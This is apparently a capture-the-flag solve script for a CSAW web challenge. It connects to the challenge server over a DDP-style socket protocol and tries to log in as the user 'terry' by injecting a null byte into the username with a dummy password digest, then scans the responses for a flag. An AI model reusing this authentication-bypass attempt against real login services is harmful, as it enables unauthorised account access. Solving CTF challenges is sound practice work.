import socket
import json
import random
import string
import time
from base64 import b64encode

def generate_random_id(length=17):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def build_connect_message():
    return {
        "msg": "connect",
        "version": "1",
        "support": ["1", "pre2", "pre1"]
    }

def build_method_message(method, params):
    return {
        "msg": "method",
        "method": method,
        "params": params,
        "id": generate_random_id()
    }

def send_message(sock, message):
    data = json.dumps(message)
    sock.send(f"{data}\n".encode())

def receive_message(sock):
    data = sock.recv(4096).decode()
    messages = data.strip().split('\n')
    return [json.loads(msg) for msg in messages if msg]

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("web.chal.csaw.io", 5000))

    # Initial connection
    send_message(sock, build_connect_message())
    time.sleep(1)

    # Try to login as terry with null byte injection
    login_params = {
        "user": {"username": "terry\x00"},
        "password": {"digest": "0"*64, "algorithm": "sha-256"}
    }

    # Send login method
    send_message(sock, build_method_message("login", [{"srp": login_params}]))

    # Receive and process responses
    while True:
        try:
            messages = receive_message(sock)
            for msg in messages:
                print(json.dumps(msg, indent=2))
                if "error" in msg:
                    if "flag" in msg.get("error", {}).get("message", "").lower():
                        print("[+] Potential flag found in error message!")
                if msg.get("msg") == "result":
                    result = msg.get("result", {})
                    if isinstance(result, dict) and "notes" in result:
                        print("[+] Found notes collection!")
        except Exception as e:
            print(f"Error: {e}")
            break

if __name__ == "__main__":
    main()

